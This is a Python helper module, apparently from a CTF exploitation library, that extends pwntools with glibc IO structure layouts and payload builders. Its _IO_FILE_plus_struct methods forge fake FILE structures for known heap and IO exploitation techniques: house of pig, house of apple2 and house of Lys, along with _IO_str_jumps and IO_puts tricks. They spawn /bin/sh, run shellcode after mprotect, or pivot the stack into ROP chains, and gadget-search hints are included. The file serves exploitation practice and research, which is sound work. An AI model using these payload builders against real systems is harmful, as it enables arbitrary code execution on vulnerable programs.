#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : io_file.py
@Time    : 2021/11/23 23:46:48
@Author  : Roderick Chan
@Email   : roderickchan@foxmail.com
@Desc    : Extension for FileStructure in pwntools and define useful IO_FILE related methods
'''


from pwn import FileStructure, context, error, flat, pack, unpack

__all__ = [
    "gconv_step_data_struct",
    "IO_iconv_t_struct",
    "IO_codecvt_struct",
    "IO_FILE_plus_struct",
    "IO_wide_data_struct",
    "obstack_chunk_struct",
    "obstack_struct",
    "payload_replace"
]

class _StructBase(object):

    vars_: list[str] = []
    length: dict[str, int] = {}
    vars_ = []
    length = {}

    def __init__(self):
        assert context.bits in (32, 64), "context.bits must be 32 or 64!"
        self.vars_ = list(self.vars_)
        self.length = self._update_var(context.bytes)
        self.setdefault()

    def setdefault(self):
        for item in self.vars_:
            object.__setattr__(self, item, 0)

    def __setattr__(self, item, value):
        if any(item in cls.__dict__ for cls in type(self).mro()) or item in self.vars_:
            object.__setattr__(self, item, value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self, item):
        if any(item in cls.__dict__ for cls in type(self).mro()) or item in self.vars_:
            return object.__getattribute__(self, item)
        error("Unknown variable %r" % item)

    def __str__(self):
        return str(self.__bytes__())[2:-1]

    def __repr__(self):
        structure = []
        for item in self.vars_:
            value = getattr(self, item)
            if isinstance(value, bytes):
                structure.append(" {}: {!r}".format(item, value))
            elif hasattr(value, "__bytes__") and not isinstance(value, int):
                structure.append(" {}: {}".format(item, repr(value)))
            else:
                structure.append(" {}: {:#x}".format(item, value))
        return "{" + "\n".join(structure) + "}"

    def __len__(self):
        return len(bytes(self))

    @staticmethod
    def _update_var(length):
        return {}

    @classmethod
    def sizeof(cls, bits=None):
        if bits is None:
            bits = context.bits
        assert bits in (32, 64), "bits must be 32 or 64!"
        return sum(cls._update_var(bits // 8).values())

    def __bytes__(self):
        structure = b''
        for val in self.vars_:
            value = getattr(self, val)
            if isinstance(value, str):
                value = value.encode('latin-1')
            if isinstance(value, (bytes, bytearray)):
                structure += bytes(value).ljust(self.length[val], b'\x00')
            elif hasattr(value, "__bytes__") and not isinstance(value, int):
                structure += bytes(value).ljust(self.length[val], b'\x00')
            elif self.length[val] > 0:
                structure += pack(value, self.length[val] * 8)
        return structure

    def struntil(self, v):
        if v not in self.vars_:
            return b''
        structure = b''
        for val in self.vars_:
            value = getattr(self, val)
            if isinstance(value, str):
                value = value.encode('latin-1')
            if isinstance(value, (bytes, bytearray)):
                structure += bytes(value).ljust(self.length[val], b'\x00')
            elif hasattr(value, "__bytes__") and not isinstance(value, int):
                structure += bytes(value).ljust(self.length[val], b'\x00')
            elif self.length[val] > 0:
                structure += pack(value, self.length[val] * 8)
            if val == v:
                break
        return structure


class gconv_step_data_struct(_StructBase):

    __annotations__ = {
        '__outbuf': int | bytes | bytearray,
        '__outbufend': int | bytes | bytearray,
        '__flags': int | bytes | bytearray,
        '__invocation_counter': int | bytes | bytearray,
        '__internal_use': int | bytes | bytearray,
        '_pad': int | bytes | bytearray,
        '__statep': int | bytes | bytearray,
        '__state': int | bytes | bytearray,
    }

    vars_ = [
        '__outbuf',
        '__outbufend',
        '__flags',
        '__invocation_counter',
        '__internal_use',
        '_pad',
        '__statep',
        '__state',
    ]

    @staticmethod
    def _update_var(length):
        return {
            '__outbuf': length,
            '__outbufend': length,
            '__flags': 4,
            '__invocation_counter': 4,
            '__internal_use': 4,
            '_pad': max(length - 4, 0),
            '__statep': length,
            '__state': 8,
        }

    @property
    def outbuf(self) -> int | bytes | bytearray:
        return self.__outbuf

    @outbuf.setter
    def outbuf(self, value: int | bytes | bytearray):
        self.__outbuf = value

    @property
    def outbufend(self) -> int | bytes | bytearray:
        return self.__outbufend

    @outbufend.setter
    def outbufend(self, value: int | bytes | bytearray):
        self.__outbufend = value

    @property
    def flags(self) -> int | bytes | bytearray:
        return self.__flags

    @flags.setter
    def flags(self, value: int | bytes | bytearray):
        self.__flags = value

    @property
    def invocation_counter(self) -> int | bytes | bytearray:
        return self.__invocation_counter

    @invocation_counter.setter
    def invocation_counter(self, value: int | bytes | bytearray):
        self.__invocation_counter = value

    @property
    def internal_use(self) -> int | bytes | bytearray:
        return self.__internal_use

    @internal_use.setter
    def internal_use(self, value: int | bytes | bytearray):
        self.__internal_use = value

    @property
    def statep(self) -> int | bytes | bytearray:
        return self.__statep

    @statep.setter
    def statep(self, value: int | bytes | bytearray):
        self.__statep = value

    @property
    def state(self) -> int | bytes | bytearray:
        return self.__state

    @state.setter
    def state(self, value: int | bytes | bytearray):
        self.__state = value

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _gconv_step_data_struct_map = {
            'i386': {
                0x0: '__outbuf',
                0x4: '__outbufend',
                0x8: '__flags',
                0xc: '__invocation_counter',
                0x10: '__internal_use',
                0x14: '__statep',
                0x18: '__state',
            },
            'amd64': {
                0x0: '__outbuf',
                0x8: '__outbufend',
                0x10: '__flags',
                0x14: '__invocation_counter',
                0x18: '__internal_use',
                0x1c: '_pad',
                0x20: '__statep',
                0x28: '__state',
            }
        }
        for k, v in _gconv_step_data_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


class IO_iconv_t_struct(_StructBase):

    step: int | bytes | bytearray
    step_data: int | bytes | bytearray | gconv_step_data_struct

    vars_ = [
        'step',
        'step_data',
    ]

    @staticmethod
    def _update_var(length):
        return {
            'step': length,
            'step_data': gconv_step_data_struct.sizeof(length * 8),
        }

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_iconv_t_struct_map = {
            'i386': {
                0x0: 'step',
                0x4: 'step_data',
            },
            'amd64': {
                0x0: 'step',
                0x8: 'step_data',
            }
        }
        for k, v in _IO_iconv_t_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


class IO_codecvt_struct(_StructBase):

    __annotations__ = {
        '__cd_in': int | bytes | bytearray | IO_iconv_t_struct,
        '__cd_out': int | bytes | bytearray | IO_iconv_t_struct,
    }

    vars_ = [
        '__cd_in',
        '__cd_out',
    ]

    @staticmethod
    def _update_var(length):
        return {
            '__cd_in': IO_iconv_t_struct.sizeof(length * 8),
            '__cd_out': IO_iconv_t_struct.sizeof(length * 8),
        }

    @property
    def cd_in(self) -> int | bytes | bytearray | IO_iconv_t_struct:
        return self.__cd_in

    @cd_in.setter
    def cd_in(self, value: int | bytes | bytearray | IO_iconv_t_struct):
        self.__cd_in = value

    @property
    def cd_out(self) -> int | bytes | bytearray | IO_iconv_t_struct:
        return self.__cd_out

    @cd_out.setter
    def cd_out(self, value: int | bytes | bytearray | IO_iconv_t_struct):
        self.__cd_out = value

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_codecvt_struct_map = {
            'i386': {
                0x0: '__cd_in',
                0x20 + 0x4: '__cd_out',
            },
            'amd64': {
                0x0: '__cd_in',
                0x38: '__cd_out',
            }
        }
        for k, v in _IO_codecvt_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


class IO_wide_data_struct(_StructBase):

    _IO_read_ptr: int | bytes | bytearray
    _IO_read_end: int | bytes | bytearray
    _IO_read_base: int | bytes | bytearray
    _IO_write_base: int | bytes | bytearray
    _IO_write_ptr: int | bytes | bytearray
    _IO_write_end: int | bytes | bytearray
    _IO_buf_base: int | bytes | bytearray
    _IO_buf_end: int | bytes | bytearray
    _IO_save_base: int | bytes | bytearray
    _IO_backup_base: int | bytes | bytearray
    _IO_save_end: int | bytes | bytearray
    _IO_state: int | bytes | bytearray
    _IO_last_state: int | bytes | bytearray
    _codecvt: int | bytes | bytearray | IO_codecvt_struct
    _shortbuf: int | bytes | bytearray
    _pad: int | bytes | bytearray
    _wide_vtable: int | bytes | bytearray

    vars_ = [
        '_IO_read_ptr',
        '_IO_read_end',
        '_IO_read_base',
        '_IO_write_base',
        '_IO_write_ptr',
        '_IO_write_end',
        '_IO_buf_base',
        '_IO_buf_end',
        '_IO_save_base',
        '_IO_backup_base',
        '_IO_save_end',
        '_IO_state',
        '_IO_last_state',
        '_codecvt',
        '_shortbuf',
        '_pad',
        '_wide_vtable',
    ]

    @staticmethod
    def _update_var(length):
        return {
            '_IO_read_ptr': length,
            '_IO_read_end': length,
            '_IO_read_base': length,
            '_IO_write_base': length,
            '_IO_write_ptr': length,
            '_IO_write_end': length,
            '_IO_buf_base': length,
            '_IO_buf_end': length,
            '_IO_save_base': length,
            '_IO_backup_base': length,
            '_IO_save_end': length,
            '_IO_state': 8,
            '_IO_last_state': 8,
            '_codecvt': IO_codecvt_struct.sizeof(length * 8),
            '_shortbuf': 4,
            '_pad': max(length - 4, 0),
            '_wide_vtable': length,
        }

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_wide_data_struct_map = {
            'i386': {
                0x0: '_IO_read_ptr',
                0x4: '_IO_read_end',
                0x8: '_IO_read_base',
                0xc: '_IO_write_base',
                0x10: '_IO_write_ptr',
                0x14: '_IO_write_end',
                0x18: '_IO_buf_base',
                0x1c: '_IO_buf_end',
                0x20: '_IO_save_base',
                0x24: '_IO_backup_base',
                0x28: '_IO_save_end',
                0x2c: '_IO_state',
                0x34: '_IO_last_state',
                0x3c: '_codecvt',
                0x84: '_shortbuf',
                0x88: '_wide_vtable',
            },
            'amd64': {
                0x0: '_IO_read_ptr',
                0x8: '_IO_read_end',
                0x10: '_IO_read_base',
                0x18: '_IO_write_base',
                0x20: '_IO_write_ptr',
                0x28: '_IO_write_end',
                0x30: '_IO_buf_base',
                0x38: '_IO_buf_end',
                0x40: '_IO_save_base',
                0x48: '_IO_backup_base',
                0x50: '_IO_save_end',
                0x58: '_IO_state',
                0x60: '_IO_last_state',
                0x68: '_codecvt',
                0xd8: '_shortbuf',
                0xdc: '_pad',
                0xe0: '_wide_vtable',
            }
        }
        for k, v in _IO_wide_data_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


class obstack_chunk_struct(_StructBase):

    limit: int | bytes | bytearray
    prev: int | bytes | bytearray
    contents: bytes | bytearray | str

    vars_ = [
        "limit",
        "prev",
        "contents",
    ]

    @staticmethod
    def _update_var(length):
        return {
            "limit": length,
            "prev": length,
            "contents": 0,
        }

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        ptr = 8 if arch == "amd64" else 4
        print("arch :", arch)
        print("  0x0 : limit ")
        print("  {} : prev ".format(hex(ptr)))
        print("  {} : contents ".format(hex(ptr * 2)))


class obstack_struct(_StructBase):

    chunk_size: int | bytes | bytearray
    chunk: int | bytes | bytearray
    object_base: int | bytes | bytearray
    next_free: int | bytes | bytearray
    chunk_limit: int | bytes | bytearray
    temp: int | bytes | bytearray
    alignment_mask: int | bytes | bytearray
    _pad0: int | bytes | bytearray
    chunkfun: int | bytes | bytearray
    freefun: int | bytes | bytearray
    extra_arg: int | bytes | bytearray
    flags: int | bytes | bytearray
    _pad1: int | bytes | bytearray

    vars_ = [
        "chunk_size",
        "chunk",
        "object_base",
        "next_free",
        "chunk_limit",
        "temp",
        "alignment_mask",
        "_pad0",
        "chunkfun",
        "freefun",
        "extra_arg",
        "flags",
        "_pad1",
    ]

    @staticmethod
    def _update_var(length):
        return {
            "chunk_size": length,
            "chunk": length,
            "object_base": length,
            "next_free": length,
            "chunk_limit": length,
            "temp": length,
            "alignment_mask": 4,
            "_pad0": max(length - 4, 0),
            "chunkfun": length,
            "freefun": length,
            "extra_arg": length,
            "flags": 4,
            "_pad1": max(length - 4, 0),
        }

    @property
    def tempint(self) -> int | bytes | bytearray:
        return self.temp

    @tempint.setter
    def tempint(self, value: int | bytes | bytearray):
        self.temp = value

    @property
    def tempptr(self) -> int | bytes | bytearray:
        return self.temp

    @tempptr.setter
    def tempptr(self, value: int | bytes | bytearray):
        self.temp = value

    def _get_flag(self, bit: int) -> int:
        return (self.flags >> bit) & 1

    def _set_flag(self, bit: int, value: int):
        assert value in (0, 1), "flag value must be 0 or 1!"
        mask = 1 << bit
        if value:
            self.flags |= mask
        else:
            self.flags &= ~mask

    @property
    def use_extra_arg(self) -> int:
        return self._get_flag(0)

    @use_extra_arg.setter
    def use_extra_arg(self, value: int):
        self._set_flag(0, value)

    @property
    def maybe_empty_object(self) -> int:
        return self._get_flag(1)

    @maybe_empty_object.setter
    def maybe_empty_object(self, value: int):
        self._set_flag(1, value)

    @property
    def alloc_failed(self) -> int:
        return self._get_flag(2)

    @alloc_failed.setter
    def alloc_failed(self, value: int):
        self._set_flag(2, value)

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        ptr = 8 if arch == "amd64" else 4
        print("arch :", arch)
        print("  0x0 : chunk_size ")
        print("  {} : chunk ".format(hex(ptr)))
        print("  {} : object_base ".format(hex(ptr * 2)))
        print("  {} : next_free ".format(hex(ptr * 3)))
        print("  {} : chunk_limit ".format(hex(ptr * 4)))
        print("  {} : temp ".format(hex(ptr * 5)))
        print("  {} : alignment_mask ".format(hex(ptr * 6)))
        if ptr == 8:
            print("  0x34 : _pad0 ")
        print("  {} : chunkfun ".format(hex(0x38 if ptr == 8 else 0x1c)))
        print("  {} : freefun ".format(hex(0x40 if ptr == 8 else 0x20)))
        print("  {} : extra_arg ".format(hex(0x48 if ptr == 8 else 0x24)))
        print("  {} : flags(use_extra_arg/maybe_empty_object/alloc_failed) ".format(hex(0x50 if ptr == 8 else 0x28)))
        if ptr == 8:
            print("  0x54 : _pad1 ")


class IO_FILE_plus_struct(FileStructure):

    def __init__(self, null=0):
        FileStructure.__init__(self, null)
    
    def __setattr__(self,item,value):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self,item,value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self,item):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self,item)
        error("Unknown variable %r" % item)
    
    def __str__(self):
        return str(self.__bytes__())[2:-1]

    
    @property
    def _mode(self) -> int:
        off = 96
        if context.bits == 64:
            off = 192
        return (self.unknown2 >> off) & 0xffffffff

    @_mode.setter
    def _mode(self, value:int):
        assert value <= 0xffffffff and value >= 0, "value error: {}".format(hex(value))
        off = 96
        if context.bits == 64:
            off = 192
        self.unknown2 |= (value << off)


    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_FILE_plus_struct_map = {
            'i386':{
                0x0:'_flags',
                0x4:'_IO_read_ptr',
                0x8:'_IO_read_end',
                0xc:'_IO_read_base',
                0x10:'_IO_write_base',
                0x14:'_IO_write_ptr',
                0x18:'_IO_write_end',
                0x1c:'_IO_buf_base',
                0x20:'_IO_buf_end',
                0x24:'_IO_save_base',
                0x28:'_IO_backup_base',
                0x2c:'_IO_save_end',
                0x30:'_markers',
                0x34:'_chain',
                0x38:'_fileno',
                0x3c:'_flags2',
                0x40:'_old_offset',
                0x44:'_cur_column',
                0x46:'_vtable_offset',
                0x47:'_shortbuf',
                0x48:'_lock',
                0x4c:'_offset',
                0x54:'_codecvt',
                0x58:'_wide_data',
                0x5c:'_freeres_list',
                0x60:'_freeres_buf',
                0x64:'__pad5',
                0x68:'_mode',
                0x6c:'_unused2',
                0x94:'vtable'
            },
            'amd64':{
                0x0:'_flags',
                0x8:'_IO_read_ptr',
                0x10:'_IO_read_end',
                0x18:'_IO_read_base',
                0x20:'_IO_write_base',
                0x28:'_IO_write_ptr',
                0x30:'_IO_write_end',
                0x38:'_IO_buf_base',
                0x40:'_IO_buf_end',
                0x48:'_IO_save_base',
                0x50:'_IO_backup_base',
                0x58:'_IO_save_end',
                0x60:'_markers',
                0x68:'_chain',
                0x70:'_fileno',
                0x74:'_flags2',
                0x78:'_old_offset',
                0x80:'_cur_column',
                0x82:'_vtable_offset',
                0x83:'_shortbuf',
                0x88:'_lock',
                0x90:'_offset',
                0x98:'_codecvt',
                0xa0:'_wide_data',
                0xa8:'_freeres_list',
                0xb0:'_freeres_buf',
                0xb8:'__pad5',
                0xc0:'_mode',
                0xc4:'_unused2',
                0xd8:'vtable'
            }
        }
        for k, v in _IO_FILE_plus_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


    def getshell_from_IO_puts_by_stdout_libc_2_23(self, stdout_store_addr:int, system_addr:int, lock_addr:int):
        """Exec shell by IO_puts by _IO_2_1_stdout_ in libc-2.23.so

        Args:
            stdout_store_addr (int): The address stored in stdout. Probably is libc.sym['_IO_2_1_stdout_'].
            system_addr (int): System address.
            lock_addr (int): Lock address.

        Returns:
            bytes: payload.
        """
        self.flags = 0x68732f6e69622f
        self._IO_read_ptr = 0x61
        self._IO_save_base = system_addr
        self._lock = lock_addr
        self.vtable = stdout_store_addr + 0x10
        return self.__bytes__()


    # only support amd64
    def getshell_by_str_jumps_finish_when_exit(self, _IO_str_jumps_addr:int, system_addr:int, bin_sh_addr:int):
        """Execute system("/bin/sh") through fake IO_FILE struct, and the version of libc should be between 2.24 and 2.29.

        Usually, you have hijacked _IO_list_all, and will call _IO_flush_all_lockp by exit or other function.

        Args:
            _IO_str_jumps_addr (int): Addr of _IO_str_jumps
            system_addr (int): Addr of system
            bin_sh_addr (int): Addr of the string: /bin/sh

        Returns:
            bytes: payload
        """
        assert context.bits == 64, "only support amd64!"
        self.flags &= ~1
        self._IO_read_ptr = 0x61
        self.unknown2 = 0
        self._IO_write_base = 0
        self._IO_write_ptr = 0x1
        self._IO_buf_base = bin_sh_addr
        self.vtable = _IO_str_jumps_addr - 8
        return self.__bytes__() + pack(0, 64) + pack(system_addr, 64)


    def house_of_pig_exec_shellcode(self, fp_heap_addr:int, gadget_addr:int, str_jumps_addr:int, 
                        setcontext_off_addr:int, mprotect_addr:int, shellcode: str or bytes, lock:int=0):
        """House of pig to exec shellcode with setcontext.

        You should fill tcache_perthread_struct[0x400] with '__free_hook - 0x1c0' addr.

        Args:
            fp_heap_addr (int): The heap addr that replace original _IO_list_all or chain
            gadget_addr (int): Gadget addr for 'mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]'
            str_jumps_addr (int): Addr of _IO_str_jumps
            setcontext_off_addr (int): Addr of setcontext and add offset, which is often 61
            mprotect_addr (int): Addr of mprotect
            shellcode ([type]): The shellcode you wanner execute
            lock (int, optional): lock value if needed. Defaults to 0.

        Returns:
            bytes: payload
        """
        assert context.bits == 64, "only support amd64!"
        self.flags = 0xfbad2800
        self._IO_write_base = 0
        self._IO_write_ptr = 0xffffffffffffff
        self.unknown2 = 0
        self._lock = lock
        self.vtable = str_jumps_addr
        self._IO_buf_base = fp_heap_addr + 0x110
        self._IO_buf_end = fp_heap_addr +0x110 + 0x1c8
        payload = flat({
            0:self.__bytes__(),
            0x100:{
                0x8: fp_heap_addr + 0x110,
                0x20: setcontext_off_addr,
                0xa0: fp_heap_addr + 0x210,
                0xa8: mprotect_addr,
                0x70: 0x2000,
                0x68: (fp_heap_addr + 0x110)&~0xfff,
                0x88: 7,
                0x100: fp_heap_addr + 0x310,
                0x1c0: gadget_addr,
                0x200: shellcode
            }
        })
        return payload

    # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
    # suitable for ubuntu 22.04
    def house_of_apple2_execmd_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, system_addr: int, cmd: str="sh"):
        """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
        assert context.bits == 64, "only support amd64!"
        assert len(cmd) < 7, "length of cmd must lower than 7"
        self.flags = unpack("  " + cmd.ljust(6, "\x00"), 64)  # "  sh"
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self._mode = 0
        self._lock = standard_FILE_addr-0x10
        self.chain = system_addr
        self._codecvt = standard_FILE_addr
        self._wide_data = standard_FILE_addr - 0x48
        self.vtable = _IO_wfile_jumps_addr
        return self.__bytes__()
    
    house_of_apple2_execmd_when_do_IO_operation = house_of_apple2_execmd_when_exit

    # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
    # suitable for ubuntu 22.04
    def house_of_apple2_stack_pivoting_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, leave_ret_addr: int, pop_rbp_addr: int, fake_rbp_addr: int):
        """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
        assert context.bits == 64, "only support amd64!"
        self.flags = 0 
        self._IO_read_ptr = pop_rbp_addr
        self._IO_read_end = fake_rbp_addr
        self._IO_read_base = leave_ret_addr
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self._mode = 0
        self._lock = standard_FILE_addr-0x10
        self.chain = leave_ret_addr
        self._codecvt = standard_FILE_addr
        self._wide_data = standard_FILE_addr - 0x48
        self.vtable = _IO_wfile_jumps_addr
        return self.__bytes__()

    house_of_apple2_stack_pivoting_when_do_IO_operation = house_of_apple2_stack_pivoting_when_exit

    def house_of_Lys_getshell_when_exit_under_2_37(self,
                                                   system_addr : int, 
                                                   _IO_obstack_jumps_addr : int, 
                                                   fp_heap_addr : int,
                                                   ):
        '''
        House_of_Lys to getshell:
        Args:
            system_addr: Address of system
            _IO_obstack_jumps_addr: Address of _IO_obstack_jumps
            fp_heap_addr: The heap addr that replace original _IO_list_all or chain
        '''
        assert context.bits == 64, "only support amd64!"
        self._IO_read_base = 1
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self._IO_write_end = 0
        self._IO_buf_base = system_addr
        self._IO_save_base = fp_heap_addr + 0xa0
        self._IO_backup_base = 1
        self._wide_data = 0x68732f6e69622f
        self.vtable = _IO_obstack_jumps_addr + 0x20
        return self.__bytes__() + pack(fp_heap_addr, 64)

    def house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36(self,
                                                                    fp_heap_addr : int,
                                                                    _IO_obstack_jumps_addr : int, 
                                                                    rop_payload : str or bytes,
                                                                    magic_gadget_one_addr : int,
                                                                    magic_gadget_two_addr : int,
                                                                    magic_gadget_three_addr : int):
        '''
        House_of_Lys to execute ROP chain by stack pivoting:

        Args:
            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
            rop_payload(bytes or str): The ROP chain you wanner execute
            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]"
            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
            magic_gadget_three_addr(int): Address of "add rsp, 0x30; mov rax, r12; pop r12; ret"

        Notices: 
            1. The size of fp_heap must be exceeded  0x128+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
            2. We can use the following code to find gadgets:
                libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")).__next__()
                libc.search(asm("mov rsp, rdx; ret")).__next__()
                libc.search(asm("add rsp, 0x30; mov rax, r12; pop r12; ret")).__next__()
        '''
        assert context.bits == 64, "only support amd64!"
        rop_chain_addr = fp_heap_addr + 0xe8
        self._IO_read_base = 1
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self._IO_write_end = 0
        self._IO_buf_base = magic_gadget_one_addr
        self._IO_save_base = rop_chain_addr
        self._IO_backup_base = 1
        self.vtable = _IO_obstack_jumps_addr + 0x20
        payload = flat(
            {
            0x0:self.__bytes__() + pack(fp_heap_addr, 64),
            0xe8:{
                0x0:magic_gadget_three_addr,
                0x8:rop_chain_addr,    #Maybe sometimes you need to replace this address
                0x20:magic_gadget_two_addr,
                0x40:rop_payload
            }
            }
        )
        return payload

    def house_of_Lys_stack_pivoting_when_exit_in_2_36(self,
                                                      fp_heap_addr : int,
                                                      _IO_obstack_jumps_addr : int,
                                                      rop_payload : bytes or str,
                                                      magic_gadget_one_addr : int,
                                                      magic_gadget_two_addr :int,
                                                      magic_gadget_three_addr : int,
                                                      ):
        '''
        House_of_Lys to execute ROP chain by stack pivoting in GLibc 2.36:

        Args:
            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
            rop_payload(bytes or str): The ROP chain you wanner execute
            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]"
            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
            magic_gadget_three_addr(int): Address of "add rsp, 0x38 ; mov rax, rcx ; ret"

        Notices: 
            1. The size of fp_heap must be exceeded  0x130+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
            2. We can use the following code to find gadgets:
                libc.search(asm("mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]")).__next__()
                libc.search(asm("mov rsp, rdx; ret")).__next__()
                libc.search(asm("add rsp, 0x38 ; mov rax, rcx ; ret")).__next__()
        '''
        assert context.bits == 64, "only support amd64!"
        rop_chain_addr = fp_heap_addr + 0xe8
        self._IO_read_base = 1
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self._IO_write_end = 0
        self._IO_buf_base = magic_gadget_one_addr - 0x8
        self._IO_save_base = rop_chain_addr
        self._IO_backup_base = 1
        self.vtable = _IO_obstack_jumps_addr + 0x20
        payload = flat(
            {
            0x0:self.__bytes__() + pack(fp_heap_addr, 64),
            0xe8:{
                0x0:rop_chain_addr,    #Maybe sometimes you need to replace this address
                0x8:magic_gadget_three_addr,
                0x28:magic_gadget_two_addr,
                0x38:rop_chain_addr + 0x8,
                0x48:rop_payload
            }
            }
        )
        return payload


def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
    assert isinstance(payload, (str, bytes)), "wrong payload!"
    assert context.bits in (32, 64), "wrong context.bits!"
    assert len(filler) == 1, "wrong filler!"
    
    if isinstance(payload, str):
        payload = payload.encode('latin-1')

    output = list(payload)
    
    if isinstance(filler, str):
        filler = filler.encode('latin-1')

    for off, data in rpdict.items():
        assert isinstance(off, (int, str, bytes)), "wrong off in rpdict! Type error!"
        assert isinstance(data, (int, bytes, str)), "wrong data: {}!".format(data)
        
        if isinstance(off, str):
            off = off.encode('latin-1')
        
        if isinstance(off, bytes):
            off = payload.find(off)
            assert off > -1, "Cannot find off in payload!"   
        else:
            assert off > -1, "wrong off in rpdict! Cannot be neg number!"

        if isinstance(data, str):
            data = data.encode('latin-1')
        elif isinstance(data, int):
            data = pack(data, word_size=context.bits, endianness=context.endian)
        distance = len(output) - len(data)
        if off > distance:
            output.extend([int.from_bytes(filler, "little")]*(off - distance))

        for i, d in enumerate(data):
            output[off+i] = d
        
    return bytes(output)
